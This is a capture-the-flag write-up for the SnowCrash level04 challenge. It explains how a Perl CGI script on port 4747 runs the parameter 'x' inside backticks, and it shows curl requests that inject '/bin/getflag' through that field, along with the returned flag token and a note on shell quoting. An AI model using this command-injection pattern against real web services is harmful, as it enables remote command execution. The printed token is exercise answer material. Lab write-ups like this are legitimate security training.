# Level04

We have a script `perl` in home. It listen a CGI request on the port `4747`. A parameter `x` is get.  
We can use it to obtain what we want because a [`backticks`](https://perldoc.perl.org/perlop#Quote-Like-Operators) are used.
This `backtricks` are system command interpreter.
Because we want to send `/bin/getflag` command, we must use this syntax: 

```bash
level04@SnowCrash:~$ curl http://192.168.56.116:4747 --data 'x=`/bin/getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Whithout `backtick` the code execute the `echo` command:

```bash
level04@SnowCrash:~$ curl --get http://192.168.56.116:4747 --data 'x="/bin/getflag"'
/bin/getflag
```

## Difference between double quote and single quote

In `double quote` the text will be interpreted:  
For example: This line is interpreted before to be send with curl. So `/bin/getflag` is executed as level04. So we haven't got the permissions.  

```bash
level04@SnowCrash:~$ curl http://192.168.56.116:4747 --data "x=`/bin/getflag`"
Check flag.Here is your token :
```

In `single quote`, the text is not interpreted before to be send. The output is sent and interpreted after.  
```bash
level04@SnowCrash:~$ curl http://192.168.56.116:4747 --data 'x=`/bin/getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
